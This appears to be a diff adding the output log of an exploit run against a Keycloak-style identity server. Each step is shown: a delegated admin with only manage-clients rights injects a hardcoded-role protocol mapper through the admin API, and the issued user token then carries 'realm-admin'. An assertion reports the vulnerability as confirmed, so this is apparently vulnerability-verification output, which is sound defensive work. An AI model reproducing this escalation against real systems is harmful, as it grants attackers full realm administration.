@@ -1,0 +1,13 @@
+[EXPLOIT] Obtaining fresh admin token... OK
+[EXPLOIT] Resolving UUID for client 'triage-client'... OK (c4692c20-cb4c-4963-a9e1-58563b9264aa)
+[EXPLOIT] Obtaining delegated-admin token (realm=triage-realm)... OK
+[EXPLOIT] Pre-exploit check: confirming delegated-admin lacks realm-admin... OK (realm-admin absent)
+[EXPLOIT] Preparing exploit payload (mapper type=oidc-hardcoded-role-mapper, role=realm-admin)... OK
+[EXPLOIT] Executing: POST /admin/realms/triage-realm/clients/c4692c20-cb4c-4963-a9e1-58563b9264aa/protocol-mappers/models
+[EXPLOIT] Mapper injection response: 201
+[EXPLOIT] Mapper created. Proceeding to token confirmation step...
+[EXPLOIT] Obtaining token for 'triage-user' via 'triage-client' (ROPC)... OK
+[EXPLOIT] Decoding issued JWT payload... OK (realm_access.roles=['realm-admin', 'offline_access', 'uma_authorization', 'default-roles-triage-realm'])
+[ASSERT] Expected realm-admin ABSENT from token, but found it → VULNERABILITY CONFIRMED (mapper injection succeeded, token contains 'realm-admin')
+{"phase": "exploit", "confirmed": true, "http_status": 201, "expected_status": 403, "endpoint": "/admin/realms/triage-realm/clients/c4692c20-cb4c-4963-a9e1-58563b9264aa/protocol-mappers/models", "detail": "HardcodedRole mapper injected by delegated-admin (manage-clients only). Token for 'triage-user' via 'triage-client' contains 'realm-admin' in realm_access.roles. Full role list: ['realm-admin', 'offline_access', 'uma_authorization', 'default-roles-triage-realm']"}
+RESULT: {"phase": "exploit", "confirmed": true, "http_status": 201, "expected_status": 403, "endpoint": "/admin/realms/triage-realm/clients/c4692c20-cb4c-4963-a9e1-58563b9264aa/protocol-mappers/models"}
